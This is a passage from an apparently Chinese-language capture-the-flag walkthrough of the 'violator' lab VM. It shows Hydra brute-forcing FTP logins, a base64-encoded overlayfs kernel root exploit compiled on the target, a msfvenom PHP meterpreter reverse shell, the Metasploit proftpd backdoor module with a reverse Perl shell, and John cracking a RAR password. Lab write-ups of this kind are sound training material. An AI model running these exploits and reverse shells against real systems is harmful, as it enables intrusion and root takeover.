pass.txt |wc -l</span><br><span class="line">10429</span><br><span class="line">➜  CeWL git:(master) ✗ hydra -L user.txt -P pass.txt -u 172.16.249.129 ftp</span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-07 18:56:59</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:4/p:23), ~6 tries per task</span><br><span class="line">[DATA] attacking ftp://172.16.249.129:21/</span><br><span class="line">[21][ftp] host: 172.16.249.129   login: aw   password: sweetestperfection</span><br><span class="line">[21][ftp] host: 172.16.249.129   login: af   password: enjoythesilence</span><br><span class="line">[21][ftp] host: 172.16.249.129   login: mg   password: bluedress</span><br><span class="line">[21][ftp] host: 172.16.249.129   login: dg   password: policyoftruth</span><br><span class="line">^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</span><br><span class="line">➜  CeWL git:(master) ✗</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol><li>第一种时直接上exp，因为msf拿到的shell没有上传功能，一句话木马好像也不行。所以先把exp.c转为base64，再写到shell里，到了服务器那边再解码成exp.c，然后编译执行。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ searchsploit -p 39166</span><br><span class="line">  Exploit: Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/39166/</span><br><span class="line">     Path: /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/39166.c</span><br><span class="line">File Type: C source, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">➜  ~ cp /home/kali-team/Kali-Team/exploit-database/exploits/linux/local/39166.c exp.c </span><br><span class="line">➜  ~ cat exp.c|base64 </span><br><span class="line">LyoNCmp1c3QgYW5vdGhlciBvdmVybGF5ZnMgZXhwbG9pdCwgd29ya3Mgb24ga2VybmVscyBiZWZv</span><br><span class="line">cmUgMjAxNS0xMi0yNg0KDQojIEV4cGxvaXQgVGl0bGU6IG92ZXJsYXlmcyBsb2NhbCByb290DQoj</span><br><span class="line">IERhdGU6IDIwMTYtMDEtMDUNCiMgRXhwbG9pdCBBdXRob3I6IHJlYmVsDQojIFZlcnNpb246IFVi</span><br><span class="line">dW50dSAxNC4wNCBMVFMsIDE1LjEwIGFuZCBtb3JlDQojIFRlc3RlZCBvbjogVWJ1bnR1IDE0LjA0</span><br><span class="line">IExUUywgMTUuMTANCiMgQ1ZFIDogQ1ZFLTIwMTUtODY2MA0KDQpibGFoQHVidW50dTp+JCBpZA0K</span><br><span class="line">dWlkPTEwMDEoYmxhaCkgZ2lkPTEwMDEoYmxhaCkgZ3JvdXBzPTEwMDEoYmxhaCkNCmJsYWhAdWJ1</span><br><span class="line">bnR1On4kIHVuYW1lIC1hICYmIGNhdCAvZXRjL2lzc3VlDQpMaW51eCB1YnVudHUgMy4xOS4wLTQy</span><br><span class="line">LWdlbmVyaWMgIzQ4fjE0LjA0LjEtVWJ1bnR1IFNNUCBGcmkgRGVjIDE4IDEwOjI0OjQ5IFVUQyAy</span><br><span class="line">MDE1IHg4Nl82NCB4ODZfNjQgeDg2XzY0IEdOVS9MaW51eA0KVWJ1bnR1IDE0LjA0LjMgTFRTIFxu</span><br><span class="line">IFxsDQpibGFoQHVidW50dTp+JCAuL292ZXJsYXlmYWlsDQpyb290QHVidW50dTp+IyBpZA0KdWlk</span><br><span class="line">PTAocm9vdCkgZ2lkPTEwMDEoYmxhaCkgZ3JvdXBzPTAocm9vdCksMTAwMShibGFoKQ0KDQoxMi8y</span><br><span class="line">MDE1DQpieSByZWJlbA0KDQo2MzU0YjRlMjNkYjIyNWI1NjVkNzlmMjI2ZjJlNDllYzBmZTFlMTli</span><br><span class="line">DQoqLw0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUg</span><br><span class="line">PHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5j</span><br><span class="line">bHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMv</span><br><span class="line">bW91bnQuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1</span><br><span class="line">ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4N</span><br><span class="line">CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvbW91bnQuaD4NCiNpbmNsdWRl</span><br><span class="line">IDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0K</span><br><span class="line">I2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPGxpbnV4L3NjaGVkLmg+DQojaW5jbHVkZSA8</span><br><span class="line">c3lzL3dhaXQuaD4NCg0Kc3RhdGljIGNoYXIgY2hpbGRfc3RhY2tbMTAyNCoxMDI0XTsNCg0Kc3Rh</span><br><span class="line">dGljIGludA0KY2hpbGRfZXhlYyh2b2lkICpzdHVmZikNCnsNCiAgICBzeXN0ZW0oInJtIC1yZiAv</span><br><span class="line">dG1wL2hheGhheCIpOw0KICAgIG1rZGlyKCIvdG1wL2hheGhheCIsIDA3NzcpOw0KICAgIG1rZGly</span><br><span class="line">KCIvdG1wL2hheGhheC93IiwgMDc3Nyk7DQogICAgbWtkaXIoIi90bXAvaGF4aGF4L3UiLDA3Nzcp</span><br><span class="line">Ow0KICAgIG1rZGlyKCIvdG1wL2hheGhheC9vIiwwNzc3KTsNCg0KICAgIGlmIChtb3VudCgib3Zl</span><br><span class="line">cmxheSIsICIvdG1wL2hheGhheC9vIiwgIm92ZXJsYXkiLCBNU19NR0NfVkFMLCAibG93ZXJkaXI9</span><br><span class="line">L2Jpbix1cHBlcmRpcj0vdG1wL2hheGhheC91LHdvcmtkaXI9L3RtcC9oYXhoYXgvdyIpICE9IDAp</span><br><span class="line">IHsNCglmcHJpbnRmKHN0ZGVyciwibW91bnQgZmFpbGVkLi5cbiIpOw0KICAgIH0NCg0KICAgIGNo</span><br><span class="line">bW9kKCIvdG1wL2hheGhheC93L3dvcmsiLDA3NzcpOw0KICAgIGNoZGlyKCIvdG1wL2hheGhheC9v</span><br><span class="line">Iik7DQogICAgY2htb2QoImJhc2giLDA0NzU1KTsNCiAgICBjaGRpcigiLyIpOw0KICAgIHVtb3Vu</span><br><span class="line">dCgiL3RtcC9oYXhoYXgvbyIpOw0KICAgIHJldHVybiAwOw0KfQ0KDQppbnQNCm1haW4oaW50IGFy</span><br><span class="line">Z2MsIGNoYXIgKiphcmd2KQ0Kew0KICAgIGludCBzdGF0dXM7DQogICAgcGlkX3Qgd3JhcHBlciwg</span><br><span class="line">aW5pdDsNCiAgICBpbnQgY2xvbmVfZmxhZ3MgPSBDTE9ORV9ORVdOUyB8IFNJR0NITEQ7DQogICAg</span><br><span class="line">c3RydWN0IHN0YXQgczsNCg0KICAgIGlmKCh3cmFwcGVyID0gZm9yaygpKSA9PSAwKSB7DQogICAg</span><br><span class="line">ICAgIGlmKHVuc2hhcmUoQ0xPTkVfTkVXVVNFUikgIT0gMCkNCiAgICAgICAgICAgIGZwcmludGYo</span><br><span class="line">c3RkZXJyLCAiZmFpbGVkIHRvIGNyZWF0ZSBuZXcgdXNlciBuYW1lc3BhY2VcbiIpOw0KDQogICAg</span><br><span class="line">ICAgIGlmKChpbml0ID0gZm9yaygpKSA9PSAwKSB7DQogICAgICAgICAgICBwaWRfdCBwaWQgPQ0K</span><br><span class="line">ICAgICAgICAgICAgICAgIGNsb25lKGNoaWxkX2V4ZWMsIGNoaWxkX3N0YWNrICsgKDEwMjQqMTAy</span><br><span class="line">NCksIGNsb25lX2ZsYWdzLCBOVUxMKTsNCiAgICAgICAgICAgIGlmKHBpZCA8IDApIHsNCiAgICAg</span><br><span class="line">ICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImZhaWxlZCB0byBjcmVhdGUgbmV3IG1vdW50IG5h</span><br><span class="line">bWVzcGFjZVxuIik7DQogICAgICAgICAgICAgICAgZXhpdCgtMSk7DQogICAgICAgICAgICB9DQoN</span><br><span class="line">CiAgICAgICAgICAgIHdhaXRwaWQocGlkLCAmc3RhdHVzLCAwKTsNCg0KICAgICAgICB9DQoNCiAg</span><br><span class="line">ICAgICAgd2FpdHBpZChpbml0LCAmc3RhdHVzLCAwKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAg</span><br><span class="line">fQ0KDQogICAgdXNsZWVwKDMwMDAwMCk7DQoNCiAgICB3YWl0KE5VTEwpOw0KDQogICAgc3RhdCgi</span><br><span class="line">L3RtcC9oYXhoYXgvdS9iYXNoIiwmcyk7DQoNCiAgICBpZihzLnN0X21vZGUgPT0gMHg4OWVkKQ0K</span><br><span class="line">ICAgICAgICBleGVjbCgiL3RtcC9oYXhoYXgvdS9iYXNoIiwiYmFzaCIsIi1wIiwiLWMiLCJybSAt</span><br><span class="line">cmYgL3RtcC9oYXhoYXg7cHl0aG9uIC1jIFwiaW1wb3J0IG9zO29zLnNldHJlc3VpZCgwLDAsMCk7</span><br><span class="line">b3MuZXhlY2woJy9iaW4vYmFzaCcsJ2Jhc2gnKTtcIiIsTlVMTCk7DQoNCiAgICBmcHJpbnRmKHN0</span><br><span class="line">ZGVyciwiY291bGRuJ3QgY3JlYXRlIHN1aWQgOihcbiIpOw0KICAgIHJldHVybiAtMTsNCn0=</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><ul><li>在服务器这边把base64解码</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dg@violator:/var/www/html$ cat exp.txt|base64 -d &gt;exp.c</span><br><span class="line">cat exp.txt|base64 -d &gt;exp.c</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dg@violator:/var/www/html$ gcc <span class="built_in">exp</span>.c</span><br><span class="line">gcc <span class="built_in">exp</span>.c</span><br><span class="line">dg@violator:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">a.out  <span class="built_in">exp</span>.c  <span class="built_in">exp</span>.txt  J0dov8.php  jc7gX.php  vMZTOjJ.php</span><br><span class="line">dg@violator:/var/www/html$ ./a.out</span><br><span class="line">./a.out</span><br><span class="line">root@violator:/var/www/html<span class="meta"># id</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1000</span>(dg) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">110</span>(lpadmin),<span class="number">111</span>(sambashare),<span class="number">1000</span>(dg)</span><br><span class="line">root@violator:/var/www/html#</span><br></pre></td></tr></table></figure><ol start="2"><li>第二种提权的方法，用用户名：dg密码：policyoftruth登上FTP，切换的<code>/var/www/html</code>然后上传Meterpreter-shell。</li></ol><ul><li>生成meterpreter-shell，FTP上传直接PUT就可以了</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p  php/meterpreter_reverse_tcp LPORT=7788 LHOST=172.16.249.1 -f raw -o msf.php</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp </span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 7788</span><br><span class="line">lport =&gt; 7788</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 172.16.249.1</span><br><span class="line">lhost =&gt; 172.16.249.1</span><br><span class="line">msf exploit(multi/handler) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.249.1:7788 </span><br><span class="line">[*] Meterpreter session 1 opened (172.16.249.1:7788 -&gt; 172.16.249.129:35623) at 2018-08-07 20:36:38 +0800</span><br></pre></td></tr></table></figure><ul><li>这个功能比较多，我平时也是用这个payload的。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@violator:/var/www/html$ su dg</span><br><span class="line">su dg</span><br><span class="line">Password: policyoftruth</span><br><span class="line"></span><br><span class="line">dg@violator:/var/www/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for dg on violator:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User dg may run the following commands on violator:</span><br><span class="line">    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd</span><br><span class="line">dg@violator:/var/www/html$</span><br></pre></td></tr></table></figure><ul><li>上面可以看到<code>proftpd</code>这个守护进程是以root权限运行的，而这东西又刚刚好有漏洞。而且执行不要root密码。我们切换到<code>/home/dg/bd/sbin/proftpd</code>把proftpd以root权限执行起来。接着就是去利用漏洞了。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">dg@violator:/var/www/html$ cd /home/dg/bd/sbin/</span><br><span class="line">cd /home/dg/bd/sbin/</span><br><span class="line">dg@violator:~/bd/sbin$ ls</span><br><span class="line">ls</span><br><span class="line">ftpscrub  ftpshut  in.proftpd  proftpd</span><br><span class="line">dg@violator:~/bd/sbin$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 564</span><br><span class="line">drwxr-xr-x  2 root root   4096 Jun  6  2016 .</span><br><span class="line">drwxr-xr-x 10 root root   4096 Jun  6  2016 ..</span><br><span class="line">-rwxr-xr-x  1 root root  15976 Jun  6  2016 ftpscrub</span><br><span class="line">-rwxr-xr-x  1 root root  10456 Jun  6  2016 ftpshut</span><br><span class="line">lrwxrwxrwx  1 root root      7 Jun  6  2016 in.proftpd -&gt; proftpd</span><br><span class="line">-rwxr-xr-x  1 root root 537488 Jun  6  2016 proftpd</span><br><span class="line">dg@violator:~/bd/sbin$ sudo ./proftpd</span><br><span class="line">sudo ./proftpd</span><br><span class="line"> - setting default address to 127.0.0.1</span><br><span class="line">localhost - SocketBindTight in effect, ignoring DefaultServer</span><br><span class="line">dg@violator:~/bd/sbin$ </span><br><span class="line">dg@violator:~/bd/sbin$ netstat -antp</span><br><span class="line">netstat -antp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:2121          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 172.16.249.129:60704    172.16.249.1:4444       CLOSE_WAIT  -               </span><br><span class="line">tcp        0      0 172.16.249.129:60705    172.16.249.1:4444       CLOSE_WAIT  -               </span><br><span class="line">tcp        0      0 172.16.249.129:35623    172.16.249.1:7788       ESTABLISHED 2669/bash       </span><br><span class="line">tcp6       0      0 :::21                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 172.16.249.129:80       172.16.249.1:51132      ESTABLISHED -               </span><br><span class="line">dg@violator:~/bd/sbin$</span><br></pre></td></tr></table></figure><ul><li>现在守护进程已经跑起来了，监听的端口是2121，但是只能由127.0.0.1访问，所以要做端口转发。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: 127.0.0.1:2121 &lt;-&gt; 127.0.0.1:2121</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; set payload cmd/unix/</span><br><span class="line">set payload cmd/unix/bind_perl</span><br><span class="line">set payload cmd/unix/bind_perl_ipv6</span><br><span class="line">set payload cmd/unix/generic</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set payload cmd/unix/reverse_bash_telnet_ssl</span><br><span class="line">set payload cmd/unix/reverse_perl</span><br><span class="line">set payload cmd/unix/reverse_perl_ssl</span><br><span class="line">set payload cmd/unix/reverse_ssl_double_telnet</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; set payload cmd/unix/reverse_perl</span><br><span class="line">payload =&gt; cmd/unix/reverse_perl</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; set lhost 172.16.249.1</span><br><span class="line">lhost =&gt; 172.16.249.1</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/proftpd_133c_backdoor):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST                   yes       The target address</span><br><span class="line">   RPORT  21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  172.16.249.1     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; run </span><br><span class="line"></span><br><span class="line">[-] Exploit failed: The following options failed to validate: RHOST.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; set rport 2121</span><br><span class="line">rport =&gt; 2121</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; set rhost 127.0.0.1</span><br><span class="line">rhost =&gt; 127.0.0.1</span><br><span class="line">msf exploit(unix/ftp/proftpd_133c_backdoor) &gt; run </span><br><span class="line">[*] Started reverse TCP handler on 172.16.249.1:4444 </span><br><span class="line">[*] 127.0.0.1:2121 - Sending Backdoor Command</span><br><span class="line">[*] Command shell session 2 opened (172.16.249.1:4444 -&gt; 172.16.249.129:60709) at 2018-08-07 21:05:32 +0800</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),65534(nogroup)</span><br></pre></td></tr></table></figure><ul><li>那到root权限了，接下来去夺旗。</li></ul><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn(<span class="string">"/bin/bash"</span>)'</span><br><span class="line">root@violator:/# ls</span><br><span class="line">ls</span><br><span class="line">bin   dev  home        lib    lost+found  mnt  <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">boot</span> <span class="title"> etc</span> <span class="title"> initrd.img</span> <span class="title"> lib64</span> <span class="title"> media</span> <span class="title">      opt</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span> <span class="title"> vmlinuz</span></span><br><span class="line"><span class="title">root@violator:/#</span> cd /root</span><br><span class="line">cd /root</span><br><span class="line">root@violator:/root#<span class="title"> ls</span></span><br><span class="line"><span class="title">ls</span></span><br><span class="line"><span class="title">flag.txt</span></span><br><span class="line"><span class="title">root@violator:/root#</span> cat<span class="title"> flag.txt</span></span><br><span class="line"><span class="title">cat</span> flag.txt</span><br><span class="line">I<span class="title"> say...</span> I<span class="title"> say...</span> I<span class="title"> say</span> boy!<span class="title"> Pumping</span> for<span class="title"> oil</span> or<span class="title"> something...?</span></span><br><span class="line"><span class="title">---Foghorn</span> Leghorn "A<span class="title"> Broken</span> Leghorn" 1950 (C)<span class="title"> W.B.</span></span><br><span class="line"><span class="title">root@violator:/root#</span></span><br></pre></td></tr></table></figure><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><ul><li>在root目录下有一个隐藏文件夹，下载回来看看发现有密码。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@violator:/root<span class="comment"># ll</span></span><br><span class="line">ll</span><br><span class="line">total 24</span><br><span class="line">drwx<span class="comment">------  3 root root 4096 Jun 14  2016 ./</span></span><br><span class="line">drwxr-xr-x 22 root root 4096 Jun 14  2016 ../</span><br><span class="line">-rw-r<span class="comment">--r--  1 root root 3106 Feb 20  2014 .bashrc</span></span><br><span class="line">d<span class="comment">--x------  2 root root 4096 Jun 14  2016 .basildon/</span></span><br><span class="line">-rw-r<span class="comment">--r--  1 root root  114 Jun 12  2016 flag.txt</span></span><br><span class="line">-rw-r<span class="comment">--r--  1 root root  140 Feb 20  2014 .profile</span></span><br><span class="line">root@violator:/root<span class="comment"># cd .basildon/</span></span><br><span class="line">cd .basildon/</span><br><span class="line">root@violator:/root/.basildon<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">crocs.rar</span><br><span class="line">root@violator:/root/.basildon<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">➜  DOWNLOAD john hash <span class="comment">--wordlist=/home/kali-team/Kali-Team/password-recovery/CeWL/pass</span></span><br><span class="line">Warning: detected hash type "rar", but the string is also recognized as "rar-opencl"</span><br><span class="line"><span class="keyword">Use</span> the <span class="string">"--format=rar-opencl"</span> <span class="keyword">option</span> <span class="keyword">to</span> <span class="keyword">force</span> loading these <span class="keyword">as</span> that <span class="keyword">type</span> instead</span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">hash</span> (rar, RAR3 [<span class="keyword">SHA1</span> AES <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other <span class="keyword">key</span> <span class="keyword">for</span> <span class="keyword">status</span></span><br><span class="line">World <span class="keyword">in</span> My Eyes (crocs.rar)</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> DONE (<span class="number">2018</span><span class="number">-08</span><span class="number">-07</span> <span class="number">21</span>:<span class="number">20</span>) <span class="number">3.703</span>g/s <span class="number">88.88</span>p/s <span class="number">88.88</span>c/s <span class="number">88.88</span>C/s enjoythesilence..World <span class="keyword">in</span> My Eyes</span><br><span class="line"><span class="keyword">Use</span> the <span class="string">"--show"</span> <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed</span><br></pre></td></tr></table></figure><ul><li>密码破解出来是World in My Eyes，别问我怎么知道的，情节需要。现在到隐写</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 